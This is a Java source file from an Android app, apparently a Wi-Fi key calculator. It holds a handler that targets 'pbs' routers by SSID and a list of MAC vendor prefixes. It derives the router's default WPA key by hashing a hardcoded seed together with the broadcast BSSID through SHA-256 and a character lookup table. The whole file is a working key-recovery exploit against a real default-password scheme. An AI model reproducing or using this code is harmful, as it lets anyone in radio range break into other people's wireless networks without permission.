package de.warker.ezwlan.handler;

import java.security.MessageDigest;
import java.util.Collection;
import java.util.LinkedList;

import android.net.wifi.ScanResult;

public class PbsWlanKeyHandler extends AbstractWlanKeyHandler {
	
	public PbsWlanKeyHandler() {
		SUPPORTED_MACS.add("00:08:27");
		SUPPORTED_MACS.add("00:13:C8");
		SUPPORTED_MACS.add("00:17:C2");
		SUPPORTED_MACS.add("00:19:3E");
		SUPPORTED_MACS.add("00:1C:A2");
		SUPPORTED_MACS.add("00:1D:8B");
		SUPPORTED_MACS.add("00:22:33");
		SUPPORTED_MACS.add("00:23:8E");
		SUPPORTED_MACS.add("00:25:53");
		SUPPORTED_MACS.add("30:39:F2");
		SUPPORTED_MACS.add("38:22:9D");
		SUPPORTED_MACS.add("64:87:D7");
		SUPPORTED_MACS.add("74:88:8B");
		SUPPORTED_MACS.add("A4:52:6F");
		SUPPORTED_MACS.add("D4:D1:84");
		
		SUPPORTED_SSID.add("pbs");
	}

	private static final String lookup = "0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz";

	private static final byte[] seed = {(byte)0x54, (byte)0x45, (byte)0x4F, (byte)0x74, (byte)0x65, (byte)0x6c, (byte)0xb6, (byte)0xd9, 
		(byte)0x86, (byte)0x96, (byte)0x8d, (byte)0x34 ,(byte)0x45, (byte)0xd2, (byte)0x3b, (byte)0x15,
		(byte)0xca, (byte)0xaf, (byte)0x12, (byte)0x84, (byte)0x02, (byte)0xac, (byte)0x56, (byte)0x00, 
		(byte)0x05, (byte)0xce, (byte)0x20, (byte)0x75, (byte)0x94, (byte)0x3f, (byte)0xdc, (byte)0xe8};

	
	@Override
	public String[] getKeys(ScanResult sr) {
		try{
			MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
			String mac = HandlerFactory.bssid_helper(sr.BSSID);
			sha256.update(seed); // OK
			sha256.update(new byte[]{(byte) Integer.parseInt(mac.substring(0, 2), 16),
					(byte) Integer.parseInt(mac.substring(2, 4), 16),
					(byte) Integer.parseInt(mac.substring(4, 6), 16),
					(byte) Integer.parseInt(mac.substring(6, 8), 16),
					(byte) Integer.parseInt(mac.substring(8, 10), 16),
					(byte) Integer.parseInt(mac.substring(10, 12), 16)});

			byte[] dig = sha256.digest(); //OK
			String key = "";
			for(byte b : dig){
				key += lookup.charAt((b>=0?b:256+b)%lookup.length());
			}
			return new String[] {key.substring(0, 13)};
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}


}
